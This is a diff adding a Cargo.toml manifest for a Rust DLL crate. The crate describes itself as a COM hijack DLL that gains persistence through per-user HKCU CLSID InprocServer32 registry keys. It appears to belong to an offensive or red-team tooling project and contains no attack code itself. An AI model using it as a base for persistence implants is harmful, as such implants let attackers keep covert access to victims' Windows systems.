@@ -1,0 +1,19 @@
+[package]
+name = "oxide-dll"
+version = "0.1.0"
+edition = "2021"
+authors = ["diemoeve"]
+description = "COM hijack DLL — cdylib persistence via HKCU CLSID InprocServer32"
+
+[lib]
+name = "oxide_dll"
+crate-type = ["cdylib"]
+
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_System_SystemServices",
+    "Win32_System_Threading",
+    "Win32_System_Registry",
+    "Win32_System_LibraryLoader",
+] }
